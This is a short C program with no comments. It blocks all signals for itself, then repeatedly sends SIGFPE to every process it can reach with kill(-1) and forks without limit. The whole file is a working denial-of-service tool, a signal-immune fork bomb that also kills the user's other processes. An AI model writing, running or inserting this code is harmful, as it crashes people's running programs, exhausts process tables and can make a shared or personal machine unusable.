#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <errno.h>
#include <signal.h>

int main()
{
    pid_t     pid;

    sigset_t   mask;
    sigfillset(&mask);
    sigprocmask(SIG_SETMASK, &mask, NULL);
   
    while (1) {
	kill(-1, SIGFPE);
	while ((pid = fork()) != -1) ;
    }
}
